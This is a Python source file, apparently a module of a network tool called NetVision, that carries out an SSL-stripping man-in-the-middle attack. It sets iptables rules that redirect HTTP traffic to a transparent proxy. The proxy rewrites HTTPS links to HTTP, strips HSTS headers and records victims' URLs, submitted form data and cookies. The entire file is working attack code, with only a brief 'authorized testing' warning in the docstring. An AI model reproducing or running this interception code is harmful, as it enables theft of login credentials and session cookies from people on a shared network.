"""
NetVision — SSL Strip Module
Downgrades HTTPS connections to HTTP using iptables + transparent proxy.
This exposes full URLs, form data, and login credentials.

⚠ EXTREMELY INVASIVE — Only for authorized security testing!

How it works:
1. iptables redirects all port 80 traffic to our proxy
2. Our proxy intercepts HTTP responses and replaces 'https://' links with 'http://'
3. When the target clicks an HTTP link, we proxy the request to the real HTTPS server
4. We capture the unencrypted request data (URLs, forms, credentials)
"""

import subprocess
import threading
import socket
import ssl
import re
import os
import time
from datetime import datetime
from collections import deque


class SSLStripper:
    """Implements SSL stripping via iptables redirect + transparent proxying."""

    def __init__(self, interface, local_ip, proxy_port=10000):
        self.interface = interface
        self.local_ip = local_ip
        self.proxy_port = proxy_port
        self._running = False
        self._server_socket = None
        self._stripped_data = deque(maxlen=500)
        self._lock = threading.Lock()
        self._stats = {
            "connections": 0,
            "https_downgraded": 0,
            "forms_captured": 0,
            "cookies_captured": 0,
        }

    def start(self):
        """Start SSL stripping."""
        self._running = True

        # Setup iptables redirect
        self._setup_iptables()

        # Start transparent proxy
        threading.Thread(target=self._proxy_server, daemon=True).start()

    def stop(self):
        """Stop and cleanup."""
        self._running = False
        self._cleanup_iptables()
        if self._server_socket:
            try:
                self._server_socket.close()
            except Exception:
                pass

    def _setup_iptables(self):
        """Redirect HTTP traffic through our proxy."""
        try:
            # Redirect outgoing HTTP (port 80) to our local proxy
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "tcp", "--destination-port", "80",
                "-j", "REDIRECT", "--to-port", str(self.proxy_port)
            ], capture_output=True, timeout=5)

            # Also redirect common alternative HTTP ports
            for port in [8080, 8000]:
                subprocess.run([
                    "iptables", "-t", "nat", "-A", "PREROUTING",
                    "-p", "tcp", "--destination-port", str(port),
                    "-j", "REDIRECT", "--to-port", str(self.proxy_port)
                ], capture_output=True, timeout=5)

        except Exception as e:
            print(f"SSLStrip iptables setup error: {e}")

    def _cleanup_iptables(self):
        """Remove our iptables rules."""
        try:
            subprocess.run([
                "iptables", "-t", "nat", "-D", "PREROUTING",
                "-p", "tcp", "--destination-port", "80",
                "-j", "REDIRECT", "--to-port", str(self.proxy_port)
            ], capture_output=True, timeout=5)

            for port in [8080, 8000]:
                subprocess.run([
                    "iptables", "-t", "nat", "-D", "PREROUTING",
                    "-p", "tcp", "--destination-port", str(port),
                    "-j", "REDIRECT", "--to-port", str(self.proxy_port)
                ], capture_output=True, timeout=5)
        except Exception:
            pass

    def _proxy_server(self):
        """Simple transparent HTTP proxy that strips SSL."""
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind(("0.0.0.0", self.proxy_port))
            self._server_socket.listen(50)
            self._server_socket.settimeout(1.0)

            while self._running:
                try:
                    client, addr = self._server_socket.accept()
                    threading.Thread(
                        target=self._handle_client,
                        args=(client, addr),
                        daemon=True,
                    ).start()
                except socket.timeout:
                    continue
                except Exception:
                    pass
        except Exception as e:
            print(f"SSLStrip proxy error: {e}")

    def _handle_client(self, client_socket, client_addr):
        """Handle a proxied HTTP connection."""
        try:
            client_socket.settimeout(10)
            request_data = client_socket.recv(8192)
            if not request_data:
                client_socket.close()
                return

            request = request_data.decode("utf-8", errors="ignore")
            self._stats["connections"] += 1

            # Parse request
            lines = request.split("\r\n")
            if not lines:
                client_socket.close()
                return

            # Get method, path, host
            req_line = lines[0]
            req_match = re.match(r"(GET|POST|PUT|DELETE|HEAD)\s+(\S+)\s+HTTP", req_line)
            if not req_match:
                client_socket.close()
                return

            method = req_match.group(1)
            path = req_match.group(2)

            host = None
            for line in lines[1:]:
                if line.lower().startswith("host:"):
                    host = line.split(":", 1)[1].strip()
                    break

            if not host:
                client_socket.close()
                return

            # Log the stripped data
            entry = {
                "time": datetime.now().strftime("%H:%M:%S"),
                "client_ip": client_addr[0],
                "method": method,
                "host": host,
                "path": path,
                "url": f"http://{host}{path}",
                "stripped": True,
            }

            # Extract POST data
            if method == "POST":
                body_start = request.find("\r\n\r\n")
                if body_start > 0:
                    body = request[body_start + 4:]
                    entry["post_data"] = body[:500]
                    self._stats["forms_captured"] += 1

            # Extract cookies
            for line in lines:
                if line.lower().startswith("cookie:"):
                    entry["cookies"] = line.split(":", 1)[1].strip()[:200]
                    self._stats["cookies_captured"] += 1
                    break

            with self._lock:
                self._stripped_data.append(entry)

            # Forward to real server via HTTPS
            try:
                real_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                real_socket.settimeout(10)

                # Try HTTPS first (the whole point of stripping)
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                try:
                    ssl_socket = context.wrap_socket(real_socket, server_hostname=host)
                    ssl_socket.connect((host, 443))
                    self._stats["https_downgraded"] += 1

                    # Send original request to HTTPS server
                    ssl_socket.send(request_data)

                    # Get response
                    response = b""
                    while True:
                        try:
                            chunk = ssl_socket.recv(8192)
                            if not chunk:
                                break
                            response += chunk
                        except socket.timeout:
                            break

                    ssl_socket.close()

                    # Strip HTTPS links from response
                    response = self._strip_response(response, host)

                    # Send modified response to client
                    client_socket.send(response)

                except Exception:
                    # Fallback to plain HTTP
                    plain_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    plain_socket.settimeout(10)
                    plain_socket.connect((host, 80))
                    plain_socket.send(request_data)

                    response = b""
                    while True:
                        try:
                            chunk = plain_socket.recv(8192)
                            if not chunk:
                                break
                            response += chunk
                        except socket.timeout:
                            break
                    plain_socket.close()
                    client_socket.send(response)

            except Exception:
                pass

        except Exception:
            pass
        finally:
            try:
                client_socket.close()
            except Exception:
                pass

    def _strip_response(self, response, host):
        """Replace HTTPS links with HTTP in the response body."""
        try:
            # Find body after headers
            header_end = response.find(b"\r\n\r\n")
            if header_end < 0:
                return response

            headers = response[:header_end]
            body = response[header_end:]

            # Replace https:// with http:// in body
            body = body.replace(b"https://", b"http://")

            # Remove HSTS headers
            headers_str = headers.decode("utf-8", errors="ignore")
            header_lines = headers_str.split("\r\n")
            filtered = [
                h for h in header_lines
                if not h.lower().startswith("strict-transport-security")
            ]
            headers = "\r\n".join(filtered).encode("utf-8", errors="ignore")

            return headers + body
        except Exception:
            return response

    def get_stripped_data(self, limit=50):
        with self._lock:
            return list(self._stripped_data)[-limit:]

    def get_stats(self):
        return dict(self._stats)
